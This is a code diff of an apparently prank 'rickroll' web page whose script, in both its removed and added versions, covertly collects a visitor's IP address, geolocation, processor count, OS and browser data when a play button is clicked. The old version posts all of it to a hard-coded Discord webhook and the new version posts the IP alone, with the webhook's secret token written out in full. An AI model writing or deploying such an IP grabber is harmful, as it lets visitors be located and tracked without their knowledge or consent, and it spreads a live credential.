@@ -91,83 +91,85 @@
         <label>Made by @viztermed</label>
     </div>
 
-<script>
-    async function getGeoLocation() {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        return data;
-    }
-
-    function getProcessorInfo() {
-        return navigator.hardwareConcurrency;
-    }
-
-    function getOSInfo() {
-        return navigator.platform;
-    }
-
-    function getBrowserInfo() {
-        return navigator.userAgent;
-    }
-
-    async function sendToWebhook(data) {
-        const webhookUrl = 'https://discord.com/api/webhooks/1247186287572684820/F7-X1ZGRRQ6EiHUqmCLKJnVcva2pLxKCJkw5TRwGkkIndvmgjsDCxy1Ay2_dl74-5f31';
-        const payload = {
-            content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
-        };
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-    }
-
-    document.getElementById('playButton').addEventListener('click', async () => {
-        document.getElementById('playButton').style.display = 'none';
-
-        const videoContainer = document.getElementById('videoContainer');
-        const rickrollVideo = document.getElementById('rickrollVideo');
-        videoContainer.style.display = 'block';
-        rickrollVideo.src += "&autoplay=1"; // Add autoplay parameter
-
-        const info = {};
-
-        try {
-            const geoData = await getGeoLocation();
-            document.getElementById('ip').innerText = geoData.ip;
-            document.getElementById('longitude').innerText = geoData.longitude;
-            document.getElementById('latitude').innerText = geoData.latitude;
-
-            info.ip = geoData.ip;
-            info.longitude = geoData.longitude;
-            info.latitude = geoData.latitude;
-        } catch (error) {
-            document.getElementById('ip').innerText = 'Error';
-            document.getElementById('longitude').innerText = 'Error';
-            document.getElementById('latitude').innerText = 'Error';
-
-            info.ip = 'Error';
-            info.longitude = 'Error';
-            info.latitude = 'Error';
+    <script>
+        async function getGeoLocation() {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return data;
         }
 
-        info.processor = getProcessorInfo();
-        info.os = getOSInfo();
-        info.browser = getBrowserInfo();
+        function getProcessorInfo() {
+            return navigator.hardwareConcurrency;
+        }
 
-        document.getElementById('processor').innerText = info.processor;
-        document.getElementById('os').innerText = info.os;
-        document.getElementById('browser').innerText = info.browser;
+        function getOSInfo() {
+            return navigator.platform;
+        }
 
-        document.querySelector('h1').style.display = 'block';
-        document.querySelectorAll('.info').forEach(element => {
-            element.style.display = 'block';
+        function getBrowserInfo() {
+            return navigator.userAgent;
+        }
+
+        async function sendToDiscordWebhook(ipAddress) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1247186287572684820/F7-X1ZGRRQ6EiHUqmCLKJnVcva2pLxKCJkw5TRwGkkIndvmgjsDCxy1Ay2_dl74-5f31';
+
+            const payload = {
+                content: `New IP address detected: ${ipAddress}`
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('Message sent to Discord webhook successfully.');
+                } else {
+                    console.error('Failed to send message to Discord webhook:', response.status);
+                }
+            } catch (error) {
+                console.error('Error sending message to Discord webhook:', error);
+            }
+        }
+
+        document.getElementById('playButton').addEventListener('click', async () => {
+            document.getElementById('playButton').style.display = 'none';
+
+            const videoContainer = document.getElementById('videoContainer');
+            const rickrollVideo = document.getElementById('rickrollVideo');
+            videoContainer.style.display = 'block';
+            rickrollVideo.src += "&autoplay=1"; // Add autoplay parameter
+
+            try {
+                const geoData = await getGeoLocation();
+                const ipAddress = geoData.ip;
+
+                // Send the IP address to Discord webhook
+                await sendToDiscordWebhook(ipAddress);
+
+                document.getElementById('ip').innerText = ipAddress;
+                document.getElementById('longitude').innerText = geoData.longitude;
+                document.getElementById('latitude').innerText = geoData.latitude;
+            } catch (error) {
+                console.error('Error getting geolocation data:', error);
+                document.getElementById('ip').innerText = 'Error';
+                document.getElementById('longitude').innerText = 'Error';
+                document.getElementById('latitude').innerText = 'Error';
+            }
+
+            document.getElementById('processor').innerText = getProcessorInfo();
+            document.getElementById('os').innerText = getOSInfo();
+            document.getElementById('browser').innerText = getBrowserInfo();
+
+            document.querySelector('h1').style.display = 'block';
+            document.querySelectorAll('.info').forEach(element => {
+                element.style.display = 'block';
+            });
         });
-
-        await sendToWebhook(info);
-    });
-</script>
+    </script>
 </body>
 </html>
